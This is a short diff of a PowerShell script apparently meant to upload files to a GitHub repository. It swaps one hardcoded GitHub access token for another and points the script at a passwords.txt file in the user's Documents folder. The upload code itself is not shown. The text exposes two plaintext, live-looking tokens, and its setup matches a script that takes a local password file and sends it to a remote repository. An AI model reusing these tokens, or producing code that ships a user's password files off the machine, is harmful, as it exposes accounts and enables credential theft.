@@ -1,6 +1,6 @@
 # GitHub File Upload Script
 
-$token = "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"
+$token = "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"
 $owner = "tomasgit17"
 $repo = "files"
 $filePath = "$env:USERPROFILE\Documents\passwords.txt"
